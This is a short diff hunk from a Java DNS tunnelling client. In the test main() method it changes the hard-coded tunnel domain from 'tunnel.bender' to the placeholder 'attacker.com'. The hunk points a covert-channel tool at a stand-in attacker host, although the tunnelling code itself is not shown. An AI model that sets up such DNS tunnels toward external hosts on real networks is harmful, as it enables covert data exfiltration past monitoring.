@@ -176,7 +176,7 @@ public class DNSTunnelClient implements Runnable, DNSTunnelConstants {
     }
 
     public static void main(String[] args) {
-        String domain = "tunnel.bender";
+        String domain = "attacker.com";
 
         // test
         DNSTunnelClient client = new DNSTunnelClient(domain);
